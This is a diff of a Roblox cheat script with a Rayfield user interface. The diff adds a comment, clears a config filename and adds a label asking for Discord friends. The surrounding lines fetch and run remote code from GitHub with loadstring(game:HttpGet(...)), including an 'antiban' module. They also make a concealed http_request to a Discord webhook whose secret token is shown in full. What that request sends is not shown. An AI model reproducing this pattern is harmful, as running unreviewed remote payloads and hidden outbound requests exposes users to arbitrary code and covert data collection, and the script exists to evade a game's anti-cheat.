@@ -1,4 +1,4 @@
--- identifier ? a
+-- identifier ? 1
 loadstring(game:HttpGet("https://raw.githubusercontent.com/username012313/rewrite/refs/heads/main/antiban"))() 
 task.wait(1)
 local RAYFIELD = loadstring(game:HttpGet("https://raw.githubusercontent.com/username012313/Simplifying-roblox-script/refs/heads/main/rayfield-cleaned"))()
@@ -10,6 +10,7 @@ if not http_request then
 else
 	--[[
 	NOTHING TO SEE HERE, TOTALLY NOT A WEBHOOK!!!!
+    please dont steal my webhook again.
 	]]
 	http_request({
 		Url = "https://discord.com/api/webhooks/1435210799919530004/zBs8Vt2Yvwx_cPLRx-tOWDuIm2ThH2-cggNLKXAnL0D0Im0A1jvS0t4Ex1sSYrwudokP",
@@ -85,7 +86,7 @@ local MAINUI = RAYFIELD:CreateWindow({
 	ConfigurationSaving = {
 		Enabled = false,
 		FolderName = nil, 
-		FileName = "Big Hub"
+		FileName = ""
 	},
 	Discord = {
 		Enabled = false, 
@@ -108,6 +109,7 @@ findPlayerVehicle()
 if game:GetService("Players").LocalPlayer.PlayerGui.GameGui.MainHUD.Options.PrivateServer.Visible == true then
 	PrivateServerLabel = Tab:CreateLabel("You are in a private server.", "info", Color3.fromRGB(255, 255, 255), false)
 end
+local discordLabel = Tab:CreateLabel("plz add my discord: realdisplayname_  im very lonely", "info", Color3.fromRGB(255, 255, 255), false)
 local Button = Tab:CreateButton({
 	Name = "Detect Car",
 	Callback = function()
